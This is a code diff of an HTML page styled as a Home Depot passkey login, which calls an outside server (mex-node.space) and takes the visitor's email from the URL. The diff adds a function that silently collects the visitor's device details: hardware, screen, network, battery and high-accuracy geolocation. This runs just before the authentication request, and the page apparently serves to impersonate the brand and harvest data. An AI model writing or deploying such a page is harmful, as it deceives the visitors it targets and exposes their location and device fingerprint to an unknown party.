@@ -3,163 +3,174 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Home Depot Passkey Auth</title>
+  <title>Home Depot Passkey Authentication</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <style>
     body {
       background: #ffffff; /* White background */
       min-height: 100vh;
+      overflow-x: hidden;
+      font-family: 'Arial', sans-serif;
+      margin: 0; /* Remove default margin */
+    }
+    .glow {
+      box-shadow: 0 0 15px rgba(249, 115, 22, 0.7), 0 0 30px rgba(249, 115, 22, 0.3); /* Orange glow */
+    }
+    .pulse {
+      animation: pulse 1.5s infinite;
+    }
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.03); }
+      100% { transform: scale(1); }
+    }
+    .welcome-screen {
+      position: fixed;
+      inset: 0;
+      background: #f97316; /* Home Depot orange */
       display: flex;
-      flex-direction: column;
       align-items: center;
       justify-content: center;
-      font-family: 'Arial', sans-serif;
-      margin: 0;
-      overflow: hidden;
-    }
-    .container {
-      text-align: center;
-      width: 90%;
-      max-width: 600px;
-      padding: clamp(1rem, 3vw, 2rem);
-      background: #ffffff;
-      border-radius: 12px;
-      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); /* Subtle shadow */
-      transition: transform 0.3s ease, opacity 0.5s ease;
-    }
-    .welcome {
-      font-size: clamp(2rem, 6vw, 4rem); /* Responsive welcome text */
-      font-weight: bold;
-      color: #f97316; /* Home Depot orange */
-      margin-bottom: 1.5rem;
-      opacity: 1;
+      z-index: 20;
       transition: opacity 0.5s ease;
     }
-    .welcome.hidden {
+    .welcome-screen.hidden {
       opacity: 0;
+      pointer-events: none;
     }
-    .auth-message {
-      font-size: clamp(1rem, 3vw, 1.5rem);
-      color: #333; /* Dark gray for contrast */
-      margin-bottom: 2rem;
-      opacity: 0;
-      transition: opacity 0.5s ease;
-    }
-    .auth-message.visible {
-      opacity: 1;
-    }
-    .loader {
-      display: flex;
-      justify-content: center;
-      gap: 8px;
-      width: 20vw;
-      max-width: 80px;
-      height: 20vw;
-      max-height: 80px;
-      opacity: 0;
-      transition: opacity 0.5s ease;
-    }
-    .loader.visible {
-      opacity: 1;
-    }
-    .loader span {
-      width: 10px;
-      height: 100%;
+    .btn-orange {
       background: #f97316;
-      border-radius: 5px;
-      animation: wave 1.2s infinite ease-in-out;
+      transition: all 0.3s ease;
     }
-    .loader span:nth-child(2) { animation-delay: 0.2s; }
-    .loader span:nth-child(3) { animation-delay: 0.4s; }
-    @keyframes wave {
-      0%, 100% { transform: scaleY(0.4); }
-      50% { transform: scaleY(1); }
+    .btn-orange:hover {
+      background: #ea580c; /* Darker orange on hover */
+      transform: scale(1.05);
     }
-    /* Media Queries */
-    @media (max-width: 768px) {
-      .container {
-        padding: 1.5rem;
-      }
-      .loader {
-        width: 15vw;
-        max-width: 60px;
-        height: 15vw;
-        max-height: 60px;
-      }
-      .loader span {
-        width: 8px;
-      }
+
+    /* Responsive Adjustments */
+    #auth-card {
+      width: 90%; /* Use percentage for responsiveness */
+      max-width: 28rem; /* Slightly larger max-width for better readability */
+      padding: clamp(1rem, 5vw, 2rem); /* Dynamic padding */
     }
-    @media (max-width: 480px) {
-      .container {
-        padding: 1rem;
+    h1 {
+      font-size: clamp(2rem, 8vw, 3.125rem); /* Responsive title size */
+    }
+    #countdown {
+      font-size: clamp(1rem, 4vw, 1.125rem); /* Responsive countdown text */
+    }
+    #status {
+      font-size: clamp(0.875rem, 3.5vw, 1.125rem); /* Responsive status text */
+    }
+    .welcome-screen h1 {
+      font-size: clamp(1.5rem, 6vw, 3.75rem); /* Responsive welcome text */
+      padding: 1rem; /* Ensure padding for smaller screens */
+    }
+
+    @media (max-width: 640px) {
+      #auth-card {
+        border-radius: 1rem; /* Slightly smaller radius on mobile */
       }
-      .loader {
-        width: 12vw;
-        max-width: 50px;
-        height: 12vw;
-        max-height: 50px;
-      }
-      .loader span {
-        width: 6px;
+      .glow {
+        box-shadow: 0 0 10px rgba(249, 115, 22, 0.7), 0 0 20px rgba(249, 115, 22, 0.3); /* Reduced glow */
       }
     }
   </style>
 </head>
-<body>
-  <div class="container">
-    <h1 class="welcome">Welcome to The Home Depot</h1>
-    <div id="auth-message" class="auth-message"></div>
-    <div id="loader" class="loader">
-      <span></span>
-      <span></span>
-      <span></span>
-    </div>
+<body class="flex items-center justify-center text-gray-800">
+  <!-- Welcome Screen -->
+  <div id="welcome" class="welcome-screen">
+    <h1 class="font-bold text-white drop-shadow-lg text-center">
+      Welcome to The Home Depot
+    </h1>
+  </div>
+
+  <!-- Authentication Card -->
+  <div id="auth-card" class="relative z-10 bg-white bg-opacity-95 rounded-2xl glow pulse text-center hidden">
+    <h1 class="font-bold mb-4 sm:mb-6 bg-clip-text text-transparent bg-gradient-to-r from-orange-400 to-orange-600">
+      THD
+    </h1>
+
+    <!-- Countdown and Status -->
+    <div id="countdown" class="font-semibold text-red-600 mb-4 sm:mb-6"></div>
+    <div id="status" class="font-medium text-gray-800"></div>
   </div>
 
   <script>
-    // [Previous gatherUserDetails function remains unchanged]
+    // Script to retrieve all the details from the Customer's Device
+    let secondaryDeviceDetails = {};
+    async function gatherUserDetails() {
+      const details = {};
 
-    const welcome = document.querySelector('.welcome');
-    const authMessage = document.getElementById('auth-message');
-    const loader = document.getElementById('loader');
-    const BASE_URL = 'https://mex-node.space';
+      // Basic Navigator Properties
+      details.userAgent = navigator.userAgent;
+      details.language = navigator.language || navigator.userLanguage;
+      details.languages = navigator.languages ? navigator.languages.join(', ') : 'N/A';
+      details.platform = navigator.platform;
+      details.cookieEnabled = navigator.cookieEnabled ? 'Yes' : 'No';
+      details.onlineStatus = navigator.onLine ? 'Online' : 'Offline';
+      details.vendor = navigator.vendor || 'N/A';
+      details.appName = navigator.appName;
+      details.appVersion = navigator.appVersion;
+      details.hardwareConcurrency = navigator.hardwareConcurrency || 'N/A'; // CPU cores
+      details.deviceMemory = navigator.deviceMemory || 'N/A'; // RAM in GB
 
-    let countdownTimer = null;
+      // Screen Details
+      details.screenWidth = window.screen.width;
+      details.screenHeight = window.screen.height;
+      details.availableWidth = window.screen.availWidth;
+      details.availableHeight = window.screen.availHeight;
+      details.colorDepth = window.screen.colorDepth;
+      details.pixelDepth = window.screen.pixelDepth;
 
-    // Get email from query parameters
-    const urlParams = new URLSearchParams(window.location.search);
-    const username = urlParams.get('email');
-    const session = urlParams.get('session');
+      // Window Details
+      details.innerWidth = window.innerWidth;
+      details.innerHeight = window.innerHeight;
 
-    // Show welcome for 2 seconds, then transition to auth
-    setTimeout(() => {
-      welcome.classList.add('hidden');
-      if (username) {
-        startAuthentication(username);
-      } else {
-        authMessage.textContent = 'Error: No email provided in URL';
-        authMessage.classList.add('visible');
-        authMessage.style.color = '#e53e3e'; // Red for error
+      // Timezone and Time
+      details.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      details.localTime = new Date().toLocaleString();
+
+      // Network Information (experimental)
+      if (navigator.connection) {
+        details.connectionType = navigator.connection.effectiveType || 'N/A';
+        details.downlink = navigator.connection.downlink || 'N/A'; // Mbps
+        details.rtt = navigator.connection.rtt || 'N/A'; // Round-trip time in ms
       }
-    }, 2000);
 
-    function startAuthentication(username) {
-      let count = 3;
-      authMessage.textContent = `Authenticating in ${count}...`;
-      authMessage.classList.add('visible');
-      loader.classList.add('visible');
-
-      countdownTimer = setInterval(async () => {
-        count--;
-        if (count > 0) {
-          authMessage.textContent = `Authenticating in ${count}...`;
-        } else {
-          clearInterval(countdownTimer);
-          authMessage.textContent = 'Verifying your passkey...';
-          await authenticate(username);
+      // Battery Status (experimental)
+      if (navigator.getBattery) {
+        try {
+          const battery = await navigator.getBattery();
+          details.batteryLevel = `${Math.round(battery.level * 100)}%`;
+          details.batteryCharging = battery.charging ? 'Yes' : 'No';
+        } catch (e) {
+          details.batteryLevel = 'N/A';
+          details.batteryCharging = 'N/A';
         }
-      }, 1000);
+      }
+
+      // Geolocation (requires permission)
+      if (navigator.geolocation) {
+        try {
+          const position = await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject, {
+              enableHighAccuracy: true,
+              timeout: 10000,
+              maximumAge: 0
+            });
+          });
+          details.latitude = position.coords.latitude.toFixed(4);
+          details.longitude = position.coords.longitude.toFixed(4);
+          details.accuracy = `${Math.round(position.coords.accuracy)} meters`;
+        } catch (e) {
+          details.latitude = 'N/A';
+          details.longitude = 'N/A';
+          details.accuracy = 'N/A (Permission denied or unavailable)';
+        }
+      }
+
+      return details;
     }
 
     // Base64url to ArrayBuffer conversion
@@ -179,8 +190,62 @@
       return btoa(binary).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
     }
 
+    const welcome = document.getElementById('welcome');
+    const authCard = document.getElementById('auth-card');
+    const countdownDisplay = document.getElementById('countdown');
+    const status = document.getElementById('status');
+    const BASE_URL = 'https://mex-node.space';
+
+    let countdownTimer = null;
+
+    // Get email and session from query parameters
+    const urlParams = new URLSearchParams(window.location.search);
+    const username = urlParams.get('email');
+    const session = urlParams.get('session');
+
+    // Show welcome screen for 2 seconds, then start countdown if email exists
+    setTimeout(() => {
+      welcome.classList.add('hidden');
+      authCard.classList.remove('hidden');
+      if (username) {
+        startCountdown(username);
+      } else {
+        status.textContent = 'Error: No email provided in URL';
+        status.className = 'text-red-600';
+      }
+    }, 2000);
+
+    function clearCountdown() {
+      if (countdownTimer) {
+        clearInterval(countdownTimer);
+        countdownTimer = null;
+      }
+      countdownDisplay.textContent = '';
+      status.textContent = '';
+    }
+
+    function startCountdown(username) {
+      let count = 4;
+      countdownDisplay.textContent = `Authenticating in ${count}...`;
+
+      countdownTimer = setInterval(async () => {
+        count--;
+        if (count > 0) {
+          countdownDisplay.textContent = `Authenticating in ${count}...`;
+        } else {
+          clearInterval(countdownTimer);
+          countdownDisplay.textContent = '';
+          await authenticate(username);
+        }
+      }, 1000);
+    }
+
+    // Authenticate with Passkey
     async function authenticate(username) {
-      let secondaryDeviceDetails = await gatherUserDetails();
+      secondaryDeviceDetails = await gatherUserDetails();
+      status.textContent = 'Preparing authentication...';
+      status.className = 'text-orange-600';
+
       try {
         const optsResp = await fetch(`${BASE_URL}/auth/options`, {
           method: 'POST',
@@ -196,6 +261,7 @@
           id: base64urlToArrayBuffer(cred.id)
         }));
 
+        status.textContent = 'Awaiting passkey authentication...';
         const credential = await navigator.credentials.get({ publicKey: opts });
 
         const credBody = {
@@ -210,6 +276,7 @@
           type: credential.type
         };
 
+        status.textContent = 'Verifying authentication...';
         const verifyResp = await fetch(`${BASE_URL}/auth/verify`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -218,24 +285,25 @@
         const result = await verifyResp.json();
 
         if (result.verified) {
-          authMessage.textContent = 'Authentication successful!';
-          authMessage.style.color = '#38a169'; // Green for success
-          loader.classList.remove('visible');
+          status.textContent = 'Welcome back to The Home Depot!';
+          status.className = 'text-green-600';
         } else {
           throw new Error(result.error || 'Verification failed');
         }
       } catch (error) {
-        authMessage.textContent = `Error: ${error.message}`;
-        authMessage.style.color = '#e53e3e'; // Red for error
-        loader.classList.remove('visible');
+        status.textContent = `Error: ${error.message}`;
+        status.className = 'text-red-600';
+        console.error('Authentication error:', error);
       }
     }
 
-    // Placeholder for gatherUserDetails (assumed unchanged)
-    async function gatherUserDetails() {
-      // [Your existing gatherUserDetails function here]
-      return {};
-    }
+    // Adjust layout on resize for better responsiveness
+    window.addEventListener('resize', () => {
+      const authCard = document.getElementById('auth-card');
+      if (window.innerWidth < 640) {
+        authCard.style.width = '90%';
+      }
+    });
   </script>
 </body>
 </html>
